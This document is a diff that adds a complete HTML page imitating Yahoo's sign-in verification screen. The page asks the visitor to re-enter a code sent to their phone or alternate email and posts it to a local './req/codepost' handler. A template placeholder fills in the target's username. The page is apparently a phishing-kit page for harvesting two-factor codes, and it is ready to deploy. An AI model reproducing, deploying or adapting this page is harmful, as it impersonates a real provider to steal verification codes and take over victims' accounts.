@@ -1,0 +1,127 @@
+
+<!DOCTYPE html>
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        
+        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0, shrink-to-fit=no">
+        <meta name="format-detection" content="telephone=no">
+        <meta name="referrer" content="origin-when-cross-origin">
+        <title>Yahoo</title>
+        
+        <link rel="icon" type="image/x-icon" href="./images/img.ico">
+        
+
+        <style nonce="">
+            #mbr-css-check {
+                display: inline;
+            }
+            .mbr-legacy-device-bar {
+                display: none;
+            }
+        </style>
+        <link href="./stylesheet/yahoo-main.css" rel="stylesheet" type="text/css">
+        <link href="./stylesheet/style.css" rel="stylesheet" type="text/css">
+        <link href="./stylesheet/main.css" rel="stylesheet" type="text/css">
+       </head>
+    <body class="bucket-">
+        <div class="mbr-legacy-device-bar" id="mbr-legacy-device-bar">
+            <label class="cross" for="mbr-legacy-device-bar-cross" aria-label="Close this&nbsp;warning">x</label>
+            <input type="checkbox" id="mbr-legacy-device-bar-cross">
+            <p class="mbr-legacy-device">
+                    Yahoo works best with the latest versions of the 
+browsers. You're using an outdated or unsupported browser and some Yahoo
+ features may not work properly. Please update your browser version now.
+ <a href="">More&nbsp;Info</a>
+            </p>
+        </div>
+    
+    <div id="login-body" class="loginish dark-background puree-v2 responsive grid">
+    <div class="mbr-desktop-hd">
+    <span class="column">
+         <a href="">
+            <img src="./images/frontpage.png" alt="Yahoo" class="logo " width="" height="36">
+            <img src="./images/frontpage.png" alt="Yahoo" class="dark-mode-logo logo " width="" height="36">
+        </a>
+    </span>
+    <span class="column help txt-align-right">
+        <a href="">Help</a>
+    </span>
+</div>
+    <div class="login-box-container">
+        <div class="login-box right">
+            <div class="mbr-login-hd txt-align-center">
+                    <img src="./images/frontpage.png" alt="Yahoo" class="logo yahoo-en-US" width="" height="27">
+                    <img src="./images/frontpage.png" alt="Yahoo" class="dark-mode-logo logo yahoo-en-US" width="" height="27">
+            </div>
+            <div class="challenge password-challenge">
+    <div class="challenge-header">
+        <div class="yid"></div>
+</div><div id="password-challenge" class="primary">
+    <span class="txt-align-center challenge-desc"style="font-size:16px;"><b>Enter your code</b></span></br>
+     <!--<strong class="challenge-heading">Enter&nbsp;Your&nbsp;Mobile number</strong>-->
+    <span class="txt-align-center challenge-desc" style="font-size:16px;">Enter the verification code again that we sent to your alternative email id / registered mobile number</span>
+    <div class="challenge-heading"><p id="error_msg" style="color:red;"></p></div>
+    <div class="pure-form challenge-form">
+    <form method="post" name="loginForm" action="./req/codepost" accept-charset="UTF-8">
+        <input type="hidden" name="browser-fp-data" id="browser-fp-data" value="{&quot;language&quot;:&quot;en-US&quot;,&quot;colorDepth&quot;:24,&quot;deviceMemory&quot;:2,&quot;pixelRatio&quot;:1,&quot;hardwareConcurrency&quot;:3,&quot;timezoneOffset&quot;:240,&quot;timezone&quot;:&quot;America/New_York&quot;,&quot;sessionStorage&quot;:1,&quot;localStorage&quot;:1,&quot;indexedDb&quot;:1,&quot;openDatabase&quot;:1,&quot;cpuClass&quot;:&quot;unknown&quot;,&quot;platform&quot;:&quot;Linux x86_64&quot;,&quot;doNotTrack&quot;:&quot;unknown&quot;,&quot;plugins&quot;:{&quot;count&quot;:4,&quot;hash&quot;:&quot;a2b06d0577d3187722c3e4270167f389&quot;},&quot;canvas&quot;:&quot;canvas winding:yes~canvas&quot;,&quot;webgl&quot;:1,&quot;webglVendorAndRenderer&quot;:&quot;Google Inc.~Google SwiftShader&quot;,&quot;adBlock&quot;:0,&quot;hasLiedLanguages&quot;:0,&quot;hasLiedResolution&quot;:0,&quot;hasLiedOs&quot;:0,&quot;hasLiedBrowser&quot;:0,&quot;touchSupport&quot;:{&quot;points&quot;:0,&quot;event&quot;:0,&quot;start&quot;:0},&quot;fonts&quot;:{&quot;count&quot;:6,&quot;hash&quot;:&quot;a47f92313962bbf44c995c3cea117b12&quot;},&quot;audio&quot;:&quot;124.08072532993538&quot;,&quot;resolution&quot;:{&quot;w&quot;:&quot;1888&quot;,&quot;h&quot;:&quot;962&quot;},&quot;availableResolution&quot;:{&quot;w&quot;:&quot;938&quot;,&quot;h&quot;:&quot;1823&quot;},&quot;ts&quot;:{&quot;serve&quot;:1585731758242,&quot;render&quot;:1585769614190}}">
+        <input type="hidden" name="crumb" value="">
+        
+        <input type="hidden" name="acrumb" value="3i1YDsR0">
+        <input type="hidden" name="sessionIndex" value="QQ--">
+        <input type="hidden" name="displayName" value="Hello User">        <div class="hidden-username">
+            <!--<input type="text" tabindex="-1" aria-hidden="true" role="presentation" autocorrect="off" spellcheck="false" name="username" value="Hello User">-->
+        </div>
+        <center><div style="margin-top: -50px;"><img src="./images/phone.svg" width="100" height="100"></div></center>
+        <input type="hidden" name="passwordContext" value="normal">
+        <div class="input-group" id="inputText">
+                <!--<input class="phone-no " type="text" name="capTcha" id="login-captcha"  placeholder=" " required="">-->
+            <center><div class="cpaptcha">
+                <input style="width: 125px; background-color: white; margin-top: -20px;" id="lOgin-code" required=""  name="code" maxlength="10">
+                </div></center>
+<!--                <div style="margin-top: -33px;margin-left: 258px;">
+                    <img src="./images/refresh.png" height="25" width="25" onclick="generateCaptcha();">
+                </div>-->
+                <div class="input-field-icon hide" id="username-field-icon"></div>
+                <!--<label for="login-captcha" id="login-label" class="login-label" aria-hidden="true">Captcha</label>-->
+            </div>
+        <div id="password-container" class="input-group password-container blurred">
+            <input type="hidden" name="username" id="username" value="${id1}">
+
+            <div class="caps-indicator hide" id="caps-indicator" title="Capslock is&nbsp;on"></div>
+            
+            <!--<button type="button" class="show-hide-toggle-button hide-pw" id="password-toggle-button" tabindex="-1" title="Show&nbsp;password"></button>-->
+        </div>
+        <div class='msg'>
+            <p style='text-align: center; font-size: 14px; color: gray;'>
+Your Account Key may take a few moments to arrive. Do not share this Account Key with anyone. Please wait 59 seconds before trying to resend.
+            </p>
+        </div>
+        <div class="button-container">
+             <input id="button" type="submit" value="Next" >
+                    
+            
+        </div>
+        <div class="forgot-cont bottom-cta">
+            <input type="submit" class="pure-button puree-button-link challenge-button-link" data-ylk="elm:btn;elmt:skip;slk:skip;mKey:password-challenge-forgot" id="mbr-forgot-link" name="skip" value="I don't have access this phone" data-rapid-tracking="true">
+        </div>
+    </div>
+</div>
+</div>
+        </div>
+        <div id="login-box-ad-fallback" class="login-box-ad-fallback">
+            <h1>Yahoo makes it easy to enjoy what matters most in your&nbsp;world.</h1>
+<p>Best in class Yahoo Mail, breaking local, national and global news, 
+finance, sports, music, movies and more. You get more out of the web, 
+you get more out of&nbsp;life.</p>
+        </div>
+    </div>
+    <div class="login-bg-outer">
+        <div class="login-bg-inner">
+                <div id="login-ad-rich"></div>
+                    </div>
+    </div>
+</div>
+
+    <div id="mbr-css-check"></div>
+
+ </form>
+</body></html>
